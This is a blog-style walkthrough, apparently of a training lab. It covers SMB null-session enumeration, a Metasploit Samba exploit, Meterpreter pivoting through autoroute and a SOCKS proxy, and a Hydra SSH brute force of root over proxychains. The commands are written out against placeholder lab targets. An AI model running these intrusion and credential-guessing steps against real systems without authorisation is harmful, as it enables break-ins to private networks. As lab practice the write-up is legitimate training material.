---
title: Pivoting V
date: 2022-06-06 12:00:00 -500
categories: [Pentesting,Pivoting]
tags: [Pentester Academy,Metasploit]
---

# Pivoting V

# Steps taken:
#### 1. Doing a portscan on the web server via NMAP:

		# nmap -sV --script=banner {target-ip}

![](/assets/img/1595.png)

	- ports 139 and 445 are open. Now, find exploits for Samba in Metasploit!

**Redoing another enumeration with NMAP**:

	# nmap -A -p- -sS {target-ip} -v

![](/assets/img/1597.png)


#### 2. Setting up the database for Metasploit to use:

		# service postgresql start
		# msfdb init
		# msfconsole -q
		msf > db_status

#### 3. Search the exploits for Samba in Metasploit:

		msf > search samba
		- Now, since the target machine is using netbios-ssn, the target machine might be a Windows machine so try to find an exploit that is compatible for Windows machine.

![](/assets/img/1596.png)

		- Not sure if this part is necessary since Null Session vulnerability seems obvious from the recent findings.

#### 4. Doing a share enumeration since this is using Samba:

		# nmblookup -A {target-ip}

![](/assets/img/1598.png)

	- Review the meaning for each column again + the keywords used!
	- First line tells us that the "VICTIM-1" machine is a workstation.
	- Since there is no 'unique' keyword in the 'Type', this computer must have been virtualized?
	- The domain name is "WORKGROUP".
	- The '<20>' record is there which means that file sharing service is up!

#### 5. Share enumeration upon proof of on file sharing service via 'Smbclient':

		# smbclient -L //{target-ip} -N
		Breakdown:
		- "-L" allows to look at what services are available on the target.
		- "-N" forces the tool to NOT ask for a password.

<u>Outcome</u>:

![](/assets/img/1599.png)

	Observations:
	1. Samba version is available: Samba 4.3.8-Ubuntu
	2. Anonymous login is successful.

#### 6. Checking for Null session conditions:

		- Since IPC$ share is available, we will first try to connect to it! You can do that too with 'smbclient'.

		# smbclient //{target-ip}/IPC$ -N

![](/assets/img/1600.png)

	- Since we can log into it anonymously, this is vulnerable to Null Session attacks!

- Accessing OTHER shares as well:

![](/assets/img/1603.png)

	- Accessing OTHER shares seems to be available as well but there is no file to be found in them.
	- Is there a hidden share then?

#### 7. Exploiting the Null Session vulnerability using "Enum4linux":

	- Check password policy first:

![](/assets/img/1601.png)

	- Since "Password Complexity" is disabled, this must be pretty easy to crack then or rather, there is no password at all that was set up?
	- Domain : VICTIM-1

- Enumerating shares on the target machine:

		# enum4linux -S {target-ip}
		- Same as nmblookup results.

- Bruteforcing share names in Windows just in case there are shares that are not showing up to us:

		# enum4linux -S /usr/share/enum4linux/share-list.txt {target-ip}
		- Didn't provide useful information though.

#### 8. Getting the SAM Account:

**Note: The directory where the python file is different and must navigate there to be able to get information on the SAM account since this is ONLY possible through Impacket. Here are the stuff you can access:**

![](/assets/img/1602.png)

	- Just zoom in! =)
	- Read the instructions for each of the python script!

![](/assets/img/1604.png)

	- Nothing came up at all! I'm not sure why but the SAM account has probably higher security level than the Null Session lab.

#### 9. After trying to access other shares, try to find "hidden" shares using NMAP:

		# nmap --script=smb-enum-shares {target-ip}
		- Same thing as before.

		# enum4linux -s /root/wordlists/100-common-passwords.txt {target-ip}

Outcome:

![](/assets/img/1605.png)

	- A new share name named "iloveyou!" was hidden. Try to access it!

#### 10. Accessing the new share name:

		# smbclient //{target-ip}/iloveyou! -N
		- Doesn't work!
		- Its a wrong share name anyway.


#### 11. Doing a **different approach** by learning possible vulnerabilities on this machine using nmap script "vuln":

		# nmap --script=vuln {target-ip}

![](/assets/img/1606.png)

#### 12. From the **Walkthrough**, the name of the exploit resides at exploit/linux/... which means that I made a mistake at step (4) thinking that the exploit should have a name exploit/windows/... which refers to the receiver of the exploit instead of the sender.

- Now, try these things:

![](/assets/img/1607.png)

	- For the purpose of time, just use "exploit/linux/samba/is_known_pipename" right now!
	- To get the version of which this exploits are executable, do "show info" AFTER the "use {exploit}".

![](/assets/img/1608.png)

- Now, exploit it!

![](/assets/img/1609.png)

	- Notice that a generic shell was only generated and not a meterpreter shell. Since we need to use this machine as a pivot to get into the internal network which the hidden machine resides, we gotta upgrade this generic shell as a Meterpreter shell.

	msf > sessions -u 1
	- Of course, background the generic shell first!

![](/assets/img/1610.png)

#### 13. In the upgrade Meterpreter shell, check the IP address of the internal network!

![](/assets/img/1611.png)

	- The internal network is: 192.148.38.0/24 where the hidden machine resides.
	- Now, background the meterpreter shell again and create the pivot by using "autoroute" on Metasploit.

#### 14. Set the options for the autoroute:

![](/assets/img/1612.png)

	- Now, execute the exploit!

#### 15. After creating the pivot on the compromised machine, you can now access the internal network through this machine! Scan the network with portscan from Metasploit!

		msf > search portscan/tcp
		- Then use whatever the result is in!

![](/assets/img/1613.png)

#### 16. Now, execute the exploit so the attacker's machine will scan the internal network!

![](/assets/img/1614.png)

	- Seems like the other machine that is alive on the internal network is 192.148.38.3 and uses port 22 (SSH).

#### 17. From this, you can scan with NMAP via proxychains so the machine from the internal network can be reached. But before that, you have to set a proxy first through the use of Metasploit with "socks4a".

		- Note that you have to set SRVPORT to the port used by proxychains which is 9050 by default.

![](/assets/img/1615.png)

	- Now, execute the exploit!

#### 18. From another terminal tab, check whether the proxy is set to that port 9050 using:

		# netstat -tpln

![](/assets/img/1616.png)

	- Now, you can see that any connection through port 9050 will be via proxychains which pretty much bounces through multiple proxies before reaches the machine on the internal network.

#### 19. Now, you can do the NMAP scan with proxychains as well.

		# proxychains nmap -sT -Pn {target-ip}
		- Since we are using proxychains, we gotta use the TCP scan and since we know that the machine we're about to scan is alive, we should use "-Pn" flag!

<u>Outcome:</u>

![](/assets/img/1617.png)

	- Since that 'SSH' is available on this machine inside the internal network, we can use Hydra to bruteforce an account to be able to access this machine.

#### 20. Using Hydra to bruteforce an account in the internal network:

		# proxychains hydra {target-ip-internal-network} ssh -t 4 -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt -f -V
		- Use the wordlists that is either on Desktop or at /usr/share/seclists!

#### 21. Logging into the internal machine:

		# proxychains ssh root@{target-ip-internal-network}

		- Then enter the found password from Hydra.



